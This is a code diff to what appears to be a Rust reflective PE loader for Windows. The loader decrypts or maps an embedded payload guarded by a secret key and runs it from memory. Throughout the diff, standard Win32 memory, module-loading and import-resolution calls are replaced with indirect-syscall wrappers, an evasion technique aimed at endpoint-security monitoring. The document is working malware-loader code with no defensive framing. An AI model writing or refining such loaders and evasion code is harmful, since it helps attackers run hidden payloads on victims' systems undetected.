@@ -1,4 +1,6 @@
 #[cfg(windows)]
+mod syscalls;
+#[cfg(windows)]
 use std::{mem, ptr};
 
 #[cfg(windows)]
@@ -16,6 +18,15 @@ use winapi::um::winnt::{
     MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
     PAGE_READWRITE,
 };
+use crate::syscalls::{
+    indirect_syscall_ldrloaddll,
+    indirect_syscall_ntallocatevirtualmemory,
+    indirect_syscall_ntprotectvirtualmemory,
+    indirect_syscall_ldrgetprocedureaddress,
+    indirect_syscall_ntflushinstructioncache,
+};
+use std::ffi::c_void;
+use winapi::um::processthreadsapi::GetCurrentProcess;
 
 // PE Header structures
 #[repr(C)]
@@ -104,7 +115,7 @@ const SECRET_KEY: &[u8] = &[
 ];
 
 #[cfg(windows)]
-const PAYLOAD: &[u8] = &[ 
+const PAYLOAD: &[u8] = &[
 ];
 
 #[cfg(windows)]
@@ -131,8 +142,15 @@ unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHea
     }
     let section_start = image_base.add(section.virtual_address as usize);
     let mut old_protect = 0;
-    let result = VirtualProtect(section_start as LPVOID, section.virtual_size as usize, protect, &mut old_protect);
-    if result == 0 {
+    let mut region_size = section.virtual_size as usize;
+    let status = indirect_syscall_ntprotectvirtualmemory(
+        GetCurrentProcess() as *mut _,
+        &mut (section_start as *mut c_void),
+        &mut region_size,
+        protect,
+        &mut old_protect,
+    );
+    if status != 0 {
         return Err(format!("Failed to set section protection (error: {})", GetLastError()));
     }
     Ok(())
@@ -182,8 +200,20 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
     while (*import_desc).name != 0 {
         let dll_name_ptr = image_base.add((*import_desc).name as usize);
         let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8);
-        let module = LoadLibraryA(dll_name_ptr as *const i8);
-        if module.is_null() {
+        let mut module = ptr::null_mut();
+        let mut dll_name_unicode = dll_name.to_str().unwrap().encode_utf16().collect::<Vec<u16>>();
+        dll_name_unicode.push(0);
+        let mut us = winapi::shared::ntdef::UNICODE_STRING {
+            Length: ((dll_name_unicode.len() - 1) * 2) as u16,
+            MaximumLength: (dll_name_unicode.len() * 2) as u16,
+            Buffer: dll_name_unicode.as_mut_ptr(),
+        };
+        let status = indirect_syscall_ldrloaddll(
+            &mut us,
+            ptr::null_mut(),
+            &mut module,
+        );
+        if status != 0 {
             return Err(format!("Failed to load DLL: {:?} (error: {})", dll_name, GetLastError()));
         }
         let mut thunk_ref = if (*import_desc).original_first_thunk != 0 {
@@ -193,13 +223,14 @@ unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders
         };
         let mut func_ref = image_base.add((*import_desc).first_thunk as usize) as *mut usize;
         while *thunk_ref != 0 {
-            let func_addr = if (*thunk_ref & (1 << 63)) != 0 {
+            let mut func_addr = ptr::null_mut();
+            if (*thunk_ref & (1 << 63)) != 0 {
                 let ordinal = (*thunk_ref & 0xFFFF) as u16;
-                GetProcAddress(module, ordinal as usize as *const i8)
+                indirect_syscall_ldrgetprocedureaddress(module, ptr::null(), ordinal, &mut func_addr);
             } else {
                 let import_by_name = image_base.add(*thunk_ref as usize) as *const ImageImportByName;
                 let func_name_ptr = &(*import_by_name).name as *const u8 as *const i8;
-                GetProcAddress(module, func_name_ptr)
+                indirect_syscall_ldrgetprocedureaddress(module, func_name_ptr as *const u8, 0, &mut func_addr);
             };
             if func_addr.is_null() {
                 return Err(format!("Failed to import function (error: {})", GetLastError()));
@@ -243,10 +274,9 @@ unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeade
     for i in 0..(*nt_headers).file_header.number_of_sections {
         set_section_permissions(image_base, &*section_header_ptr.offset(i as isize))?;
     }
-    use winapi::um::processthreadsapi::GetCurrentProcess;
-    FlushInstructionCache(
-        GetCurrentProcess(),
-        image_base as LPVOID,
+    indirect_syscall_ntflushinstructioncache(
+        GetCurrentProcess() as *mut _,
+        image_base as *mut _,
         (*nt_headers).optional_header.size_of_image as usize,
     );
     Ok(())
@@ -257,7 +287,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     if pe_data.len() < mem::size_of::<ImageDosHeader>() {
         return Err("PE data is too small for DOS header".to_string());
     }
-    
+
     let dos_header = &*(pe_data.as_ptr() as *const ImageDosHeader);
     if dos_header.e_magic != 0x5A4D {
         return Err("Invalid PE file (MZ signature missing)".to_string());
@@ -272,7 +302,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     if nt_headers.signature != 0x4550 {
         return Err("Invalid PE signature".to_string());
     }
-    
+
     if nt_headers.optional_header.magic != 0x20b {
         return Err("Loader only supports 64-bit (x64) PE files.".to_string());
     }
@@ -282,10 +312,20 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
         return Err("Invalid PE file (SizeOfImage is zero)".to_string());
     }
 
-    let image_base = VirtualAlloc(ptr::null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    let mut image_base: *mut c_void = ptr::null_mut();
+    let mut region_size = image_size;
 
-    if image_base.is_null() {
-        return Err(format!("Memory allocation failed (error: {})", GetLastError()));
+    let status = indirect_syscall_ntallocatevirtualmemory(
+        GetCurrentProcess() as *mut _,
+        &mut image_base,
+        0,
+        &mut region_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE,
+    );
+
+    if status != 0 {
+        return Err(format!("Memory allocation failed with status: {}", status));
     }
 
     let headers_size = nt_headers.optional_header.size_of_headers as usize;
@@ -312,7 +352,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     process_tls_callbacks(image_base as *mut u8, nt_headers)?;
 
     let entry_point = (image_base as usize + nt_headers.optional_header.address_of_entry_point as usize) as *const ();
-    
+
     if nt_headers.optional_header.subsystem == 2 || nt_headers.optional_header.subsystem == 3 {
         let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry_point);
         entry_fn();
